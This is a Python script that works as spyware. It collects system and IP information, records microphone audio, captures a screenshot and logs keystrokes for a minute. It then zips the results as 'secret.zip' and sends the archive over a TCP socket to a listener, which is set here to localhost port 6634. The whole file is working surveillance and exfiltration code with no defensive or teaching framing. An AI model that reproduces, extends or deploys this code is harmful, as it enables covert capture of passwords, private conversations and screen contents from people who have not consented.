# get comp-info b
import socket
import platform

# To log keys
from pynput.keyboard import Key, Listener
# to gather diff data from device

import win32clipboard

# track time
import time
import os

# record mic of the device
from scipy.io.wavfile import write
import sounddevice as soundD

# secure file **might not use
# from cryptography.fernet import Fernet

# get to username
import getpass
from requests import get  # get comp info

# screenshot
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

import socket
# creating the client
import time as T
from zipfile import ZipFile as zf
import base64

def key_pressed(key):
    if time.time()>bt+60:
        logfile.close()
        return False
    else:

        key_info=str(key)+" is pressed --"+"was pressed at "+str(time.asctime())
        logfile.write(key_info+"\n")
        print(key)


def key_released(key):  # if esc is clicked leave
    if key == Key.esc:
        return False




def writing_info():  # host info
    with open("SYSinfo.txt", "w+") as i:
        name = socket.gethostname()
        privateIpADD = socket.gethostbyname(name)  # private ipadd
        i.write("Host Name: " + name + '\n')
        i.write("---- Here is the information of the Host device  :\n")
        i.write("Host Processor: " + (platform.processor()) + '\n')
        i.write("Host System: " + (platform.system()) + '\n')
        # i.write("Host System: " + (platform.python_build()) + '\n')
        i.write("--- Host device IP Addresses  :\n")
        i.write("Host Private IP Address: " + name + '\n')

        try:
            publicIpADD = get("https://api64.ipify.org").text  # will get and convert (public)ip
            i.write("Host Public IP Address: " + publicIpADD + '\n')
        except Exception:
            i.write("Host Public IP Address: ipify query might be full,the public IP is unknown... \n")


def mic():
    freqency = 44100  # defualt freqency
    micTime = mic_seconds  # record in seconds
    recording = soundD.rec(int(micTime * freqency), samplerate=freqency, channels=2)
    soundD.wait()

    write(audioFile, freqency, recording)


def taking_screenshots():
    sc = ImageGrab.grab()
    sc.save("sc.png")

logfile=open("keylogs.txt", "w+")
bt=time.time()

count = 0
keys = []

mic_seconds = 5
audioFile = "micRecording.wav"

writing_info()
mic()
taking_screenshots()

with Listener(on_press=key_pressed, on_release=key_released) as listener:
    listener.join()



with zf('sent_files\\secret.zip','w') as zipped:
    zipped.write('sc.png')
    zipped.write('SYSinfo.txt')
    zipped.write('micRecording.wav')
    zipped.write("keylogs.txt")
# time.sleep(2)
zipped_file = open('sent_files\\secret.zip', 'rb').read()

ip = "127.0.0.1"
port = 6634
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        break

    except Exception as ex:
        print(ex)
print("sending files......")
# zipped_file=zipped_file.encode()
# zipped_file=base64.b64encode(zipped_file)
s.sendall(zipped_file)
print("file sent.........")
s.close()
